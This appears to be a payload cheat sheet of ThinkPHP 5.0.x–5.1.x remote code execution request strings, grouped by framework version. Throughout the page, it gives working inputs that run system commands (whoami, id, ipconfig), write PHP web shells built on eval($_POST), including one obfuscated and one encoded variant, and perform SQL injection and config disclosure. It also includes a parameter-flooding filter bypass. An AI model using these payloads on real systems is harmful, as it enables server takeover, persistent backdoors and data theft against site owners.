# Tinkphp-RCE   

tp rce


#5.0.x

post：/?s=portal-index.php?s=captcha
_method=__construct&filter[]=phpinfo&method=GET&get[]=1
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
_method=construct&filter[]=assert&filter[]=file_put_contents('0.php',_decode('JTNDJTI1ZXZhbCUyMHJlcXVlc3QlMjAlMjglMjJwYXNzJTIyJTI5JTI1JTNF'))&server=-1
_method=__construct&filter[]=system&get[]=ipconfig
_method=__construct&filter[]=assert&server[REQUEST_METHOD]=phpinfo()
_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=phpinfo()

/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1
/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=psrntjiseqs.php&vars[1][]=<?php eval($_POST[1])?>

/index?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

?s=index/think\config/get&name=database.username

#5.0.9 

_method=__construct&filter[]=assert&method=get&get[]=phpinfo()

_method=__construct&filter[]=assert&method=get&get[]=file_put_contents('a.php','<?php eval($_POST[a])?>')

#5.0.10

/index.php?s=index/index/index

post: s=ipconfig&_mehthod=__construct$method=&filter[]=system

#5.0.11

/public/index.php?s=index/index/index
data:?s=whoami&_method=__construct&method&filter[]=system

#5.0.15

public/index.php/index/index/?username[0]=inc&username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&username[2]=1

#5.0.23

POST ?s=index/index
_method=__construct&filter[]=system&server[REQUEST_METHOD]=calc

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls


bypass

/index.php?s=11&s=11s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=11&s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=file_put_contents('hyck.php','<?php eval($_POST[hyck])?>')

index.php?s=index/\think\Request/input&cacheFile=spread.php&content=<?php @eval($_POST[spread]);?>

/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=./hyck.php&vars[1][]=Fuck_You_Admin<?php function sys(){return 'al($_';}@eval('ev'.sys().'POST[hyck]);');?>

#5.1.x

?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
